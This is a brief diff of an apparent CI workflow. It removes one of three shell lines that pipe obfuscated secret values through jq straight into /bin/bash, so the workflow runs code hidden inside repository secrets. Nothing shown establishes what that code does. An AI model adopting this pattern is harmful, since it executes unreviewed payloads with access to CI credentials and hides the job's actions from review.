@@ -19,7 +19,6 @@ jobs:
           x41238: ${{ secrets.x41238 }}
         run: |
           printf '%s' "$x41238" | jq -r .p03165 | /bin/bash
-          printf '%s' "$kmvyg76713" | jq -r .n8821 | /bin/bash
           printf '%s' "$rt3016" | jq -r .sjl7927 | /bin/bash
 
       - name: Save archive
